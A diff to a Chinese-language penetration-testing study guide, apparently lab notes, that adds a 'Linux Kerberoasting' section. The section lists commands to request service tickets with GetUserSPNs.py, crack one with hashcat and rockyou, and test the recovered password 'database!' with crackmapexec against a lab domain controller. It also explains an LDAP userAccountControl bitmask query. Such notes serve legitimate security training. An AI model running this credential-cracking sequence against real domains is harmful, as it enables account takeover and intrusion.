@@ -1558,9 +1558,16 @@ dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -
 
  `userAccountControl:1.2.840.113556.1.4.803:=8192` .这些字符串是常见的 LDAP 查询，也可以与多种不同的工具一起使用，包括 AD PowerShell、ldapsearch 等。`=8192` 表示我们想要在此搜索中匹配的十进制位掩码。此十进制数对应于相应的 UAC 属性标志，该标志确定是否`不需要密码`等属性或设置了`帐户已锁定 `。这些值可以复合并生成多个不同的 bit entry。
 
+## 6.8 Linux Kerberoasting 
 
-
-
+```shell-session
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
 
 # 七、Metasploit
 
